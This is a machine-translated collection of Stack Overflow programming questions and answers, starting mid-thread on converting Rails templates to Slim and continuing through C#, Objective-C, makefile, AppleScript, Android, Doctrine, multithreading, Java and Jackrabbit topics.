xargs ruby -e 'ARGV.each { |i| puts "haml2slim #{i} #{i.sub(/haml$/,"slim")}"}' | \
bash

# Clean ERB and HAML templates
find . -name '*erb' -exec rm -f {} \;
find . -name '*haml' -exec rm -f {} \; 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2014-07-06T23:28:47.533

我喜欢事实上的答案，但我认为人们很想知道一种新的宝石，它可以更快、更轻松地做到这一点。但目前它相当有缺陷。:(

查看[html2slim](https://github.com/slim-template/slim/wiki/Template-Converters-ERB-to-SLIM#using-html2slim)。假设我想将所有视图从 更改`.erb`为`.slim`，然后我（从头开始，从您的 rails 根目录）运行以下命令：

```
gem install html2slim
erb2slim app/views --delete 
```

如果您运行`erb2slim -h`，您可以看到`-d`/`--delete`是之后删除 erb 的选项，并`--trace`显示任何错误的完整回溯。作者的说明，它仍然是实验性的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-16T18:53:21.477

只需将文件重命名为以`.html.slim`代替结尾`.html.erb`，并将内容替换为以下内容：

```
strong.result= "Votes: #{voteable.votes_for - voteable.votes_against}"

= form_tag user_votes_path(current_user) do
  = radio_button_tag :thumb_direction, :up
  = radio_button_tag :thumb_direction, :down
  = hidden_field_tag :voteable, @voteable
  = submit_tag :vote 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-04-22T23:31:03.310

这个在线工具正是你想要的[http://erb2slim.herokuapp.com](http://erb2slim.herokuapp.com)就是将 erb 片段转换为 slim。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-05-23T21:22:43.630

与之前的答案一样，我使用两个宝石：

```
 gem install html2haml haml2slim 
```

然后：

```
 find app/views -name \*.erb -print | sed 'p;s/.erb$/.haml/' | xargs -n2 sh -c 'html2haml "$0" "$1" && rm "$0"' 
```

替换`*.erb`为转换后的`*.haml`版本。

现在转换`*.haml`和`*.slim`删除`*.haml`文件：

```
 haml2slim -d app/views 
```

毕竟可选：

```
 gem uninstall html2haml haml2slim 
```

# c# - 将 XML 转换为内容列表

> ID：10347573
> 
> 赞同：1
> 
> 时间：2012-04-27T08:46:35.300
> 
> 标签：c#, xml, linq, api, linq-to-objects

我有一个来自我的 php 站点的 xml 文件作为 api。

这是从我的 php 应用程序返回的 xml。

```
<xml>
<overzicht>
<item>
<sessieID>6</sessieID>
<onderwerp>Vrijwilligers, een uitstervend rasnn</onderwerp>
<omschrijving>Ode aan de vrijwilligers jjj</omschrijving>
<sprekerID>1</sprekerID>
<lokaalID>20</lokaalID>
<themaID>1</themaID>
<typeID>2</typeID>
<periodeID>2</periodeID>
<datum>2012-02-20</datum>
<maximaleInschrijvingen>1</maximaleInschrijvingen>
<spreker>
    <sprekerID>1</sprekerID>
    <sprekerNaam>Rik Torfs</sprekerNaam>
    <loginID>13</loginID>
</spreker>
<lokaal>
    <lokaalID>20</lokaalID>
    <campusNaam>Malle</campusNaam>
    <lokaalOpCampus>W10</lokaalOpCampus>
    <typeID>2</typeID>
</lokaal>
</item>
<item>
<sessieID>15</sessieID>
<onderwerp>VPKB</onderwerp>
<omschrijving/>
<sprekerID>6</sprekerID>
<lokaalID>2</lokaalID>
<themaID>1</themaID>
<typeID>1</typeID>
<periodeID>2</periodeID>
<datum>2012-02-20</datum>
<maximaleInschrijvingen>50</maximaleInschrijvingen>
<spreker>
    <sprekerID>6</sprekerID>
    <sprekerNaam>Dick Wursten</sprekerNaam>
    <loginID>18</loginID>
</spreker>
<lokaal>
    <lokaalID>2</lokaalID>
    <campusNaam>KHK Vorselaar</campusNaam>
    <lokaalOpCampus>A102</lokaalOpCampus>
    <typeID>1</typeID>
</lokaal>
</item>
...
</overzicht>
</xml> 
```

这是我的 C# 代码。我想获取 Sessie 的所有列表。

```
XDocument xmlDoc = XDocument.Parse(e.Result);
List<Sessie> sessies = 
    (
        from item in xmlDoc.Descendants("overzicht")
        select new Sessie(
                item.Element("onderwerp").Value,
                Convert.ToInt32(item.Element("sessieID").Value),
                item.Element("omschrijving").Value,
                (Spreker)(
                            new Spreker(
                                Convert.ToInt32(item.Element("spreker").Element("sprekerID").Value), 
                                item.Element("spreker").Element("sprekernaam").Value)
                        ),
                Convert.ToDateTime(item.Element("datum").Value),
                Convert.ToInt32(item.Element("maximaleInschrijvingen").Value),
                (Lokaal)(
                            new Lokaal(
                                Convert.ToInt32(item.Element("lokaal").Element("lokaalID").Value), 
                                item.Element("lokaal").Element("campusNaam").Value, 
                                item.Element("lokaal").Element("lokaalOpCampus").Value)
                        )
                )
    ).ToList<Sessie>(); 
```

我知道我的代码不适用于此异常。

“空引用异常”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:49:40.177

有一个相当明显的问题开始。查看查询的开头：

```
from item in xmlDoc.Descendants("overzicht")
select new Sessie(item.Element("onderwerp").Value,
... 
```

只有在`<onderwerp>`直接位于`<overzicht>`. 没有——它在`<item>`元素之下。也许（给定范围变量名称）您的意思是：

```
from item in xmlDoc.Descendants("item")
select new Sessie(item.Element("onderwerp").Value,
... 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T08:51:51.527

查询

```
 from item in xmlDoc.Descendants("overzicht") 
```

将返回一个`<overzicht>`元素列表。`item.Element("onderwerp")`不存在，您缺少`<item>`介于两者之间的元素。

简单修复：

```
 from item in xmlDoc.Descendants("item") 
```

# objective-c - 目标 C：如何为未在类接口中声明的实例变量生成警告？

> ID：10347583
> 
> 赞同：2
> 
> 时间：2012-04-27T08:47:30.040
> 
> 标签：objective-c, clang

我最近在使用 XCode 4.2 和 Apple LLVM 编译器 3.0 / LLVM-GCC 处理我公司的 iOS 项目时处理了几个问题。

下面是代码

```
A.h
@interface A{
   int _count;
};
@property(nonatomic,assign) count; 
@end
A.mm
@implementation A
@synthesize count = _cont;//note a typo here !!!
//... I use _count in below code 
@end 
```

错字不会产生编译错误或警告，编译器或运行时（实际上我不确定是谁做的，我最好的猜测应该是编译器）将为我们生成一个 _cont 实例 ivar。

此功能非常适合封装。我们的头文件可能会更干净。然而，这样的错字很难注意到。所以我想知道是否有任何设置可以为这种情况生成警告？我搜索 Clang 的官方网站没有任何发现。

有人会建议我根本不要在类接口中声明实例并始终使用 self.count。首先我不喜欢这种代码风格，其次在某些情况下，您的“setCount”方法可能会做的不仅仅是更改实例值，最后我们在引入此功能之前就开始了我们的产品。我不想改变现有代码的风格。

这里有人遇到同样的问题吗？有什么好的想法和最佳实践吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:09:48.627

这是不可能的。编译器应该如何识别你的错字？

此外，您应该已经认识到不再需要为您的财产编写自己的 ivar，因为 @synthesize count = _count; 已经足以在代码后面通过 _count 与您联系 iVar。

# loops - makefile 循环 var 管道

> ID：10347586
> 
> 赞同：0
> 
> 时间：2012-04-27T08:47:36.917
> 
> 标签：loops, command-line, makefile

我正在尝试在 make 中执行一个循环来执行远程 ssh 命令，以选择进程的 pid 来杀死它。像这样：

```
target:
  for node in 23 ; do \
    echo $$node ; \
    ssh user@pc$$node "~/jdk1.6.0_31/bin/jps | grep CassandraDaemon | awk  '{print \$$1}'" > $(PID); \
    ssh user@pc$$node "kill -9 $(PID); \
  done 
```

但我得到：

```
/bin/sh: 3: Syntax error: ";" unexpected 
```

我认为的问题是存储远程 ssh 命令返回的 pid（没有`> $(PID)`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:53:11.873

`>`重定向到文件，而不是变量。 `$()`以您可以分配给变量的方式捕获...但也是`make`语法，因此您需要对其进行转义。您还需要在使用它时对其进行转义，以免获得`make`变量（不，您不能将其存储在`make`变量中）。

```
for node in 23 ; do \
    echo $$node ; \
    PID=$$(ssh user@pc$$node "~/jdk1.6.0_31/bin/jps | grep CassandraDaemon | awk  '{print \$$1}'"); \
    ssh user@pc$$node "kill -9 $$PID; \
done 
```

（假设您的许多编辑中的一个与我复制并粘贴以修复它时相比没有太大改变......）

# applescript - 将桌面上的所有文件发送到印象笔记然后删除

> ID：10347589
> 
> 赞同：1
> 
> 时间：2012-04-27T08:47:49.110
> 
> 标签：applescript

早上好，

我正在尝试编写一个可以运行的 AppleScript，它将我桌面上的所有文件发送到 Evernote，然后删除这些文件。我迄今为止的代码是：

```
on run {input}

tell application "Finder"
    select every file of desktop
end tell

tell application "Evernote"
    repeat with SelectedFile in input
        try
            create note from file SelectedFile notebook "Auto Import"
        end try

    end repeat

end tell

tell application "Finder"
    delete every file of desktop
end tell

end run 
```

如果我运行它，那么第一个和最后一个“告诉”工作正常（即脚本突出显示然后删除桌面上的所有文件），但中间的“告诉”没有做任何事情。

但是，如果我手动突出显示桌面上的所有文件，然后只运行中间的“告诉”，那么它会很好地导入 - 每个项目都按预期放入单独的注释中。

如您所知，我是 AppleScript 的新手——我怀疑我需要将选定的文件放在某种数组中，但无法弄清楚。帮助！

非常感谢

富有的

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T23:37:54.230

你的代码失败了，因为你的变量和通过 Finder 选择的文件之间没有关系`input`——这意味着你的列表是空的，Evernote 根本没有处理任何东西。您通过将 Evernote 导入命令包装在一个`try`块中而不进行任何错误处理来混淆了问题，这意味着**所有**错误都不会被注意到（为避免此类问题，最好始终在`on error`子句中记录错误消息，如果没有别的）。

此外，您实际上不需要通过 AppleScript 选择桌面上的文件来处理它们。以下代码将抓取所有可见文件（不包括包/应用程序等伪文件）：

```
tell application "System Events"
    set desktopFiles to every disk item of (desktop folder of user domain) whose visible is true and class is file
end tell 
```

将您以这种方式检索到的列表传递给 Evernote 进行处理：

```
repeat with aFile in desktopFiles as list
    try
        tell application "Evernote" to create note from file (aFile as alias) notebook "Auto Import"
        tell application "System Events" to delete aFile
    on error errorMessage
        log errorMessage
    end try
end repeat 
```

你很高兴。

请注意，通过明智地放置删除命令（紧跟在导入命令之后，在 try 块内，在所有文件的循环内），您可以确保仅在 Evernote 在导入时没有错误时才调用它，同时避免遍历文件几次。

`tell`最后一点：如果只有一个命令要执行，则不必对语句使用块语法——使用`tell <target> to <command>`更容易，并且会让你远离嵌套的上下文地狱。

*感谢@adayzone 对列表处理和别名强制的更正*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T11:35:24.350

尝试

```
tell application "System Events" to set xxx to get every file of (desktop folder of user domain) whose visible is true

repeat with i from 1 to count of xxx
    set SelectedFile to item i of xxx as alias
    try
        tell application "Evernote" to create note from file SelectedFile notebook "Auto Import"
        tell application "Finder" to delete SelectedFile
    end try
end repeat 
```

谢谢@fanaugen

# c# - 使用 C# 在 Excel 中快速命名范围

> ID：10347590
> 
> 赞同：0
> 
> 时间：2012-04-27T08:47:50.930
> 
> 标签：c#, excel, range

我正在开发一个广泛使用 Excel 文件的 C# 项目。工作表单元格中的大多数值都是通过将名称分配给标识单个单元格的范围来引用的。到目前为止，所有工作表都是通过单个单元格迭代组装的：每一个都按照其名称和格式单独插入，显然它非常缓慢。为了加快速度，我设法将数据数组插入到一张表中，但我仍然没有找到如何用范围名称做同样的事情。我仍然坚持这段代码

```
for (var row = 1; row <= rows; row++)
{
    for (var column = 1; column <= columns; column++)
    {
        string refCell = GetExcelColumnName(column) + row.ToString();
        myExcelWorkbook.Names.Add(labels[row - 1, column - 1], sheet.Range[refCell , refCell ], true, misValue, misValue, misValue, misValue, misValue, misValue, misValue, misValue);
    }
} 
```

这甚至比以前的版本还要慢（它需要 MINUTES 来填充~10000 个名称的列表）。所以我想知道是否有办法以更快的方式进行这种插入。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T15:12:49.847

通常的方法是让你的范围名称覆盖多个单元格，这样命名范围就会少得多。

# javascript - Chrome 扩展程序：单击时更改链接的 URL

> ID：10347591
> 
> 赞同：2
> 
> 时间：2012-04-27T08:47:54.687
> 
> 标签：javascript, jquery, regex, google-chrome-extension

我正在尝试制作一个 Chrome 扩展程序来更改 Facebook 上发布的某些链接指向的 URL。起初我想在 中做一个简单的正则表达式搜索和替换`$(document).ready()`，但是 Facebook 动态加载了很多主屏幕内容，所以会遗漏很多东西。然后我写了这个方法：

```
$('a').click(function () {
    console.log(this.href);
} 
```

...然后我可以`this.href`在问题上进行匹配等，当用户单击链接时，如何更改链接的目标？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:50:54.683

```
$('a').click(function(){
    $(this).attr('href', yourdestination);
}) 
```

# iphone - 为#import 导入什么库

> ID：10347595
> 
> 赞同：10
> 
> 时间：2012-04-27T08:48:01.857
> 
> 标签：iphone, xcode, asihttprequest

我已经导入`ASIHTTP files`到我的项目中，里面 `ASIWebPageRequest.m`有以下导入：

```
#import <libxml/HTMLparser.h> 
```

这是不被认可的。我应该添加什么库才能被识别？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-04-27T08:57:40.563

转到项目构建设置（项目->编辑项目设置->构建）并找到“搜索路径”。在“标题搜索路径”中添加以下路径：

> $(SDKROOT)/usr/include/libxml2

请注意，升级 OS X 后，您可能会丢失所有开发标头（至少在 Mavericks 中我就是这种情况）。要重新安装命令行工具，请运行：

> xcode-选择--安装

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-10-19T07:34:15.967

使用 xcode 4.5，它不起作用。我尝试使用 /usr/include/libxml2 并且效果很好

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-04-11T11:03:48.693

放置`${SDK_DIR}/usr/include/libxml2`“标题搜索路径”构建设置对我有用。

*信息：我正在使用 xcode 5

# android - 如何在 Android 谷歌地图中显示当前位置？

> ID：10347596
> 
> 赞同：1
> 
> 时间：2012-04-27T08:48:01.767
> 
> 标签：android, google-maps, currentlocation

我想在谷歌地图中显示设备的当前位置我该怎么做我现在正在显示法线贴图。以下代码显示设备的纬度和纬度位置我如何使用该纬度和纬度在地图中显示地址职位。

```
package com.appulento.mapsexample.pack;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;

import com.google.android.maps.MapActivity;
import com.google.android.maps.MapView;

    public class MapsMianClass extends  MapActivity {
        /** Called when the activity is first created. */
        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.main);
            MapView mapView = (MapView) findViewById(R.id.mapview1);
            mapView.setBuiltInZoomControls(true);

            /* Use the LocationManager class to obtain GPS locations */
            LocationManager mlocManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);

            LocationListener mlocListener = new MyLocationListener();
            mlocManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
          }

          /* Class My Location Listener */
          public class MyLocationListener implements LocationListener
          {

            @Override
            public void onLocationChanged(Location loc)
            {
              loc.getLatitude();
              loc.getLongitude();

              String Text = "My current location is: " +
              "Latitud = " + loc.getLatitude() +
              "Longitud = " + loc.getLongitude();

              Toast.makeText( getApplicationContext(), Text, Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onProviderDisabled(String provider)
            {
              Toast.makeText( getApplicationContext(), "Gps Disabled", Toast.LENGTH_SHORT ).show();
            }

            @Override
            public void onProviderEnabled(String provider)
            {
              Toast.makeText( getApplicationContext(), "Gps Enabled", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras)
            {

            }

          }

        @Override
        protected boolean isRouteDisplayed() {
            // TODO Auto-generated method stub
            return false;
        }

      } 
```

提前致谢.....

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-28T23:25:24.573

由于这个问题已经存在一年多了，因此在 Android 上显示地图的方法已经改变。

获得当前位置（纬度和经度）后，您需要做的就是将此坐标传递给地图标记。

[这是我从Google Maps Android API V2](https://developers.google.com/maps/documentation/android/marker#add_a_marker)文档中复制和粘贴的片段：

```
private GoogleMap mMap;
mMap = ((MapFragment) getFragmentManager().findFragmentById(R.id.map)).getMap();
mMap.addMarker(new MarkerOptions()
        .position(new LatLng(0, 0))
        .title("Hello world")); 
```

至于如何使用谷歌地图，他们在文档中也有完整的指南。

我在此处粘贴了完整步骤的链接以节省您的精力：

[Google Maps Android API V2 - 入门](https://developers.google.com/maps/documentation/android/start)

如果您仔细按照那里的步骤操作，您应该毫无问题地显示地图和显示标记。

还有一点您可能需要注意：在 API 控制台中启用 Google Maps 选项时，请确保您启用了**Google Maps Android API V2**，同时请确保您选择了正确的证书，同时检索 API 密钥。

希望这能帮助你走出迷雾。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:09:53.543

1.  获取 GPS 位置。
2.  在地图上绘制一个图标（或标记）到 GPS 位置。
3.  移动地图，使当前位置可见。

请告诉哪个步骤导致问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-07T06:48:30.410

使用反向地理编码将这些 latlngs 转换为地址，然后您可以使用文本视图或 Toast 来显示该地址。此链接可能会有所帮助。 [http://www.oodlestechnologies.com/blogs/Displaying-Current-Location-on-Google-Maps](http://www.oodlestechnologies.com/blogs/Displaying-Current-Location-on-Google-Maps)

# c# - 获取 ASP.NET 开发服务器端口号

> ID：10347603
> 
> 赞同：3
> 
> 时间：2012-04-27T08:48:29.913
> 
> 标签：c#, asp.net-mvc-3

我需要在 C# 方法中获取 asp.net 开发服务器端口号。你能帮助我吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-27T09:02:54.620

您可以从请求中获取它：

```
Request.Url.Port 
```

这不是严格意义上的开发 Web 服务器的端口，这是当前使用的 Web 服务器的端口。

# c# - Linq to SQL 连接和分组

> ID：10347605
> 
> 赞同：0
> 
> 时间：2012-04-27T08:48:36.607
> 
> 标签：c#, asp.net, linq-to-sql

我的数据库中有两个表：

镇：

```
userid, buildingid 
```

建造：

```
buildingid, buildingname 
```

我想要的是像这样填充 GridView：

![网格视图](../Images/313c8f6ed17f77763cf06fd4ba18fb96.png)

但我不希望建筑物被多次展示。这是我的代码：

```
var buildings = dc.Towns
            .Where(t => t.userid == userid)
            .GroupJoin(dc.Buildings,
                       t => t.buildingid,
                       b => b.buildingid,
                       (Towns, Buildings) => new
                                                {
                                                    BuildningName = Buildings.First().buildingname,
                                                    Count = Towns.Building.Towns.Count()
                                                });
        gvBuildings.DataSource = buildings.ToList();
        gvBuildings.DataBind(); 
```

有效的新代码：

```
var buildings = (from t in dc.Towns
                         where t.userid == userid
                         join b in dc.Buildings
                             on t.buildingid equals b.buildingid
                             into j1
                         from j2 in j1.DefaultIfEmpty()
                         group j2 by j2.buildingname
                         into grouped
                         select new
                                    {
                                        buildingname = grouped.Key,
                                        Count = grouped.Count()
                                    });
        gvBuildings.DataSource = buildings.ToList();
        gvBuildings.DataBind(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:55:50.370

这样的事情不会做吗？

```
Users
    .Select(User => new {User, User.Building})
    .GroupBy(x => x.Building)
    .Select(g=> new {Building = g.Key, Count = g.Count()}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:58:06.850

```
var buildings = from t in dc.Towns
join b in dc.Buildings on t.buildingid equals b.buildingid into j1
from j2 in j1.DefaultIfEmpty()
group j2 by b.buildingname into grouped
select new { buildingname = grouped.key, Count = grouped.Count()} 
```

我认为应该这样做。我没有测试过它，所以它可能会出错，但它会是这样的。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-04-27T09:12:34.320

根据我使用 Linq to SQL 的经验，当表达式变得复杂时，最好编写一个存储过程并使用 Linq to SQL 调用它。通过这种方式，您可以获得更好的可维护性和可升级性。

我认为“Linqu to SQL”不是纯 SQL 的一种选择，而是一种获取 SQL 数据集的硬类型对象表示的工具。而已。

希望它可以帮助你。

# php - 如何在 Doctrine 中基于动态变量进行动态关联？

> ID：10347611
> 
> 赞同：2
> 
> 时间：2012-04-27T08:48:52.677
> 
> 标签：php, oop, zend-framework, doctrine-orm

我对教义2很陌生。我需要建立这样的连接：

标签有一个（抽象）资源连接。（抽象）资源有标签。

我想根据代码动态键入实体资源的对象。所以通过这种方式，我可以将标签附加到任何实现给定接口的实体上。

我在教义中使用 Zend Framework 和注释 docblock 样式。

另一个例子是一个“消息”实体，它在系统中代表一条文本消息，它有一个作者和接收者关联，但我希望根据作者和接收者有不同的目标。例如，管理员实体向用户实体发送消息，或者用户实体向 VipUser 实体发送消息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-11T08:55:05.257

听起来类表继承是解决这个问题的完美解决方案。

[http://docs.doctrine-project.org/projects/doctrine-orm/en/2.0.x/reference/inheritance-mapping.html#class-table-inheritance](http://docs.doctrine-project.org/projects/doctrine-orm/en/2.0.x/reference/inheritance-mapping.html#class-table-inheritance)

您基本上需要创建您的父类（标签）并为其每个子类提供一个鉴别器映射。所以例如..

```
/** 
 * @Entity 
 * @InheritanceType("JOINED")
 * @DiscriminatorColumn(name="discr", type="string")
 * @DiscriminatorMap({"tag" = "Tag", "message" = "Message", "otherentity" = "OtherEntity"})
 */
class Tag
{
   // tag properties / definitions etc
}

/** @Entity */
class Message extends Tag
{
   // Message specific stuff
} 
```

您可以在您需要的任何其他实体上扩展您的“标签”实体。只要记住为它更新你的鉴别器映射值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-11T15:33:42.777

看看这个教义2扩展：

[https://github.com/FabienPennequin/DoctrineExtensions-Taggable](https://github.com/FabienPennequin/DoctrineExtensions-Taggable)

我相信这会做你想要的。

# multithreading - 为什么多线程应用程序通常会扩展不好？

> ID：10347613
> 
> 赞同：5
> 
> 时间：2012-04-27T08:48:57.277
> 
> 标签：multithreading, parallel-processing, multicore

我目前正在考虑多线程应用程序可能无法很好扩展的原因。

我知道并且一直在与之抗争的两个原因是：

1.  线程间通信没有做好，速度变慢
2.  芯片上的内核数量和 CPU 的内存带宽不会按比例增加。这会导致每个内核的内存带宽较慢，芯片上的内核使用量越多。

还有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-03T09:12:17.257

对于第 1 点），它们不一定“做得不好”，但在大多数情况下，存在进程/线程必须相互等待的关键部分，例如更新一些关键数据。Amdahl 定律很好地描述了这一点。

我想补充的另一点是任务本身的可伸缩性。如果任务（输入）不可扩展，则增加处理能力（核心/线程）无法提高整体吞吐量。例如，一个应用程序要处理数据流，但是有一个约束，不能并行处理来自同一流的数据包（由于顺序考虑），那么可扩展性将受到流数的限制。

此外，考虑到 O(1) 和 O(n) 算法之间的差异，算法的可扩展性更为基础。当然，也许这里的主题关注处理能力的可扩展性，而不是数据大小。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:10:57.710

我认为，在 (1) 中，您已经确定了可能对多线程应用程序的性能产生负面影响的最重要因素之一。特别是。谷歌“虚假分享”。

(2)，但是只影响一组多线程应用程序 - 那些并行运行 CPU 绑定线程的应用程序。如果一个应用程序使用许多受 I/O 限制的线程，则 (2) 无关紧要。

看看我这里的盒子，它有 100 个进程和 1403 个线程，CPU 使用率 3%。100 个进程中只有 7 个是单线程的。因此，大多数应用程序都是多线程的，但 I/O 等待。

目前，如果它只有一个核心，我的盒子可以很好地工作。当然，点击一个结束我的浏览器的链接可能会稍微慢一点来打开一个复杂的页面，但不会慢很多。

在最常见的情况下，应用程序是多线程的，以利用抢占式多任务程序的高 I/O 性能，应用程序的扩展性确实非常好，即使在单核 CPU 上也是如此。

尽量不要陷入认为抢占式多任务操作系统都是关于“并行执行 CPU 密集型任务”的陷阱——它们实际上通过强制需要锁定、同步、信号等来使这变得困难。它更多的是关于高性能I/O，协作调度程序非常不擅长的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-12T06:35:28.463

许多多线程应用程序都是围绕“一个用户一个线程”概念构建的，这意味着一旦需要处理用户或杂务，就会为任务分配一个线程。每个额外的线程都会增加调度程序的负载，导致所有处理都完成，试图确定此时应该运行哪个线程。将此称为“调度程序饱和”。

Windows（多线程引擎，而不是 95/98/Me 等）有一种称为 I/O 完成端口的机制，它建议每个处理器一个线程以获得最佳性能。基于 IOCP 的应用程序通常非常快，但与往常一样，瓶颈反而出现在其他地方，例如耗尽某些类型的操作系统内存或在通信介质上等待。

你可以在这里搜索 IOCP，它有自己的标签。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-08T23:37:00.443

I would add:

3.  The more threads, the smaller their share of CPU cache. A typical modern CPU's might have 3 levels of cache: L1, L2 and L3\. L1 might be private to that core, but L2 and L3 might be shared between cores on the die or something. So a single thread can use the entire L2 & L3, but if you have many threads then you get many more cache misses, depending on the profile of your algorithm.

See also:

[many-core CPU's: Programming techniques to avoid disappointing scalability](https://stackoverflow.com/questions/13465425/many-core-cpus-programming-techniques-to-avoid-disappointing-scalability)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-07-26T14:05:00.940

它可能受到主内存的**固定最大带宽**的限制，您的程序已用完内存带宽，但是您使更多线程无法创建更多可用内存带宽。这与您的特定应用程序有关，无论是内存有界的还是计算有界的，请参阅[屋顶线模型](https://en.wikipedia.org/wiki/Roofline_model)。

# java - 在android的textview中过滤文本

> ID：10347614
> 
> 赞同：0
> 
> 时间：2012-04-27T08:48:59.523
> 
> 标签：java, android

有没有办法从`TextView`android中删除整数。例如，假设我们有这样的文本：

`123Isuru456Ranasinghe`

我希望这个文本在删除整数后是这样的

`IsuruRanasinghe`

我如何在android中实现这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:56:35.127

这会帮助你。

```
 public static String removeDigits(String text) {
        int length = text.length();
        StringBuffer buffer = new StringBuffer(length);
        for(int i = 0; i < length; i++) {
            char ch = text.charAt(i);
            if (!Character.isDigit(ch)) {
                buffer.append(ch);
            }
        }
        return buffer.toString();
    } 
```

**另一个简单的选择：**

```
// do it in just one line of code
String num = text.replaceAll(”[\\d]“, “”); 
```

使用删除数字返回您的字符串。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T09:03:40.130

这只是纯Java。与安卓无关。
这是执行您想要的操作的代码。

```
String str = "123Isuru456Ranasinghe";
String newStr = str.replaceAll("[0-9]", ""); 
```

经过一些测试，似乎最长的解决方案在性能方面是最好的！

```
public static void main(String[] arg) throws IOException {
    // Building a long string...
    StringBuilder str = new StringBuilder();
    for (int i = 0; i < 1000000; i++)
        str.append("123Isuru456Ranasinghe");

    removeNum1(str.toString());
    removeNum2(str.toString());
}

// With a replaceAll => 1743 ms
private static void removeNum1(String _str) {
    long start = System.currentTimeMillis();
    String finalString = _str.replaceAll("[0-9]", "");
    System.out.println(System.currentTimeMillis() - start);
}

// With StringBuilder and loop => 348 ms
private static void removeNum2(String _str) {
    long start = System.currentTimeMillis();

    StringBuilder finalString = new StringBuilder();
    char currentChar;
    for (int i = 0; i < _str.length(); ++i) {
        currentChar = _str.charAt(i);
        if (Character.isLetter(currentChar)) {
            finalString.append(currentChar);
        }
    }
    System.out.println(System.currentTimeMillis() - start);
} 
```

使用循环要快得多。但在你的情况下，它有点没用：p

现在你必须在“慢”和短写之间做出选择，而且非常快但有点复杂。一切都取决于你需要什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-27T09:01:09.750

```
StringBuilder ans = new StringBuilder();
char currentChar;
for (int i = 0; i < str.length(); ++i) {
    currentChar = str.charAt(i);
    if (Character.isLetter(currentChar)) {
        ans.append(currentChar);
    }
} 
```

# java - 使用文件系统而不是数据库在jackrabbit中存储pdf文件

> ID：10347616
> 
> 赞同：8
> 
> 时间：2012-04-27T08:49:05.503
> 
> 标签：java, jackrabbit, jcr

在我们的项目中，我们使用带有 spring 和 tomcat 的 jackrabbit 来管理 pdf 文件。

目前，MySql 数据库被用于存储 blob 文件（就 jackrabbit 而言，它被称为 BundleDbPersistenceManager）。

一旦生成的文件数量增加，我们就想到使用文件系统而不是数据库来提高性能并消除复制开销。在[规范](http://wiki.apache.org/jackrabbit/PersistenceManagerFAQ)中， jackrabbit 团队建议使用 BundleFsPersistenceManager 代替，但带有这样的评论

> 不适用于生产环境（只读用途除外）

**有没有人有使用 BundleFsPersistenceManager 的经验，并且可以参考从 mysql 数据库中的 blob 到文件系统中的文件的无痛迁移的任何资源？**

非常感谢您提前

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T13:34:20.847

[Jackrabbit 中的持久化有点复杂，首先阅读配置概述文档](http://wiki.apache.org/jackrabbit/ConfigurationOverview)是有意义的。

在 Jackrabbit 中，二进制文件默认存储在[数据存储中，而不是](http://wiki.apache.org/jackrabbit/DataStore)[持久性管理器](http://wiki.apache.org/jackrabbit/PersistenceManagerFAQ)中。即使您使用`BundleDbPersistenceManager`，大型二进制文件也存储在数据存储中。您可以将（默认）`FileDataStore`与`BundleDbPersistenceManager`.

我建议*不要*使用 BundleFsPersistenceManager，因为如果程序在写入时被杀死，数据很容易损坏。

# extjs4 - 如何在 EXtJS 列布局中增加列空间

> ID：10347617
> 
> 赞同：4
> 
> 时间：2012-04-27T08:49:07.293
> 
> 标签：extjs4

我设计了一个如图所示的输入表格，

我需要在**测试框和中间名标签**之间有相同的空间。

我的代码如下，

```
var patientForm = new Ext.FormPanel({
layout: 'column',
columnWidth:1.5,
renderTo: "patientCreation",
frame: true,
autoScroll:true,
title: 'Create Patient',
bodyStyle: 'padding:9px',           
width: 900,
items: [
{   xtype: 'textfield',
    fieldLabel: 'FirstName',
    name: 'firstName',
    vtype : 'alpha',
    allowBlank:false
},{
    xtype: 'textfield',
    fieldLabel: 'MiddleName',
    name: 'middleName',
    vtype : 'alpha'             
},{
    xtype: 'textfield',
    fieldLabel: 'LastName',
    name: 'lastName',
    vtype : 'alpha',
    allowBlank:false
},{
    xtype: 'textfield',
    fieldLabel: 'Email',
    name: 'email',
